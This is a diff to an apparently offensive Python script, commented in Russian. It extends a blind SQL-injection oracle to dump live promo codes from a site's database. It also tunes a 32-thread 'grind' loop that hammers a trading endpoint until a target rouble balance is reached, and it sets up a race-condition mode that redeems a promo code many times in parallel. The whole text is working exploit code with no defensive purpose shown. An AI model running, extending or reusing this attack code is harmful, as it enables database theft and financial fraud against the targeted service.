@@ -196,6 +196,26 @@ def sql_count(expr):
     return lo
 
 
+def live_codes_fast():
+    """Только коды с uses_left>0. В разы дешевле полного дампа: десятки запросов вместо тысяч."""
+    n = sql_count("SELECT count(*) FROM promos WHERE uses_left>0")
+    print("  живых строк: %s" % n)
+    if not n or n < 1:
+        return []
+    d = sql_str("SELECT group_concat(code||'@'||uses_left,'|') FROM promos WHERE uses_left>0", "live")
+    out = []
+    for part in (d or "").split("|"):
+        if "@" in part:
+            c, u = part.rsplit("@", 1)
+            try:
+                out.append((c, int(u)))
+            except ValueError:
+                pass
+    for c, u in out:
+        print("    %-14s uses_left=%d" % (c, u))
+    return out
+
+
 def dump_db(quick=True):
     """Вытащить схему и таблицу промокодов. quick=True — не трогать таблицы без code."""
     print("=" * 70)
@@ -346,7 +366,8 @@ def grind(threads=32, seconds=4200):
     print("=" * 70)
 
     stop = threading.Event()
-    stats = {"trades": 0, "wins": 0, "loss": 0}
+    stats = {"trades": 0, "wins": 0, "loss": 0, "err": {}}
+    errlock = threading.Lock()
     peak = {"v": start_bal}
     t0 = time.time()
 
@@ -369,6 +390,15 @@ def grind(threads=32, seconds=4200):
                     j = json.loads(js(d))
                 except Exception:
                     j = {}
+                if "won" not in j:
+                    # это не сделка, а ошибка (нет средств / лимит / не та сессия)
+                    e = j.get("error") or plain(d)[:60]
+                    with errlock:
+                        stats["err"][e] = stats["err"].get(e, 0) + 1
+                    if any(w in str(e).lower() for w in ("средств", "войдите", "баланс")):
+                        stop.set()
+                    time.sleep(0.05)
+                    continue
                 with LOCK:
                     stats["trades"] += 1
                     if j.get("won"):
@@ -401,6 +431,9 @@ def grind(threads=32, seconds=4200):
         b = balance()
         print("  %5.0f с | сделок %6d | %5.1f сд/с | выигрышей %6d | баланс %6d ₽ | осталось %d ₽"
               % (el, stats["trades"], stats["trades"] / el, stats["wins"], b, max(0, TARGET_RUB - b)))
+        if stats["err"]:
+            top = sorted(stats["err"].items(), key=lambda x: -x[1])[:2]
+            print("       ошибки: %s" % top)
         sys.stdout.flush()
         if b >= TARGET_RUB:
             stop.set()
@@ -444,6 +477,15 @@ def main():
             buy()
         return
 
+    if mode == "rate":
+        fresh_account()
+        print("замер: 20 с гриндa на 32 keep-alive потоках\n")
+        b0 = balance()
+        grind(threads=32, seconds=20)
+        b1 = balance()
+        print("\nитог замера: %d -> %d ₽ (дельта %d ₽)" % (b0, b1, b1 - b0))
+        return
+
     if mode == "race":
         fresh_account()
         hits, credited, errs = volley(n, os.environ.get("M2_CODE", "0OKVRCRTKC"))
@@ -457,9 +499,16 @@ def main():
         return
 
     # auto
-    rows = dump_db()
-    live = [c for _, c, u in rows if u is not None and u > 0]
-    print("\nживых кодов (uses_left>0): %s" % live)
+    print("=" * 70)
+    print("ЖИВЫЕ ПРОМОКОДЫ (быстрый запрос, без полного дампа)")
+    print("=" * 70)
+    t, f = oracle("1=1"), oracle("1=2")
+    if not (t and f is False):
+        print("  оракул не работает")
+        return
+    live = [c for c, u in live_codes_fast()]
+    print("  запросов к оракулу: %d" % CALLS["n"])
+    print("\nживых кодов: %s" % live)
 
     if not live:
         print("\nВсе промокоды исчерпаны. Остаётся только гринд:")
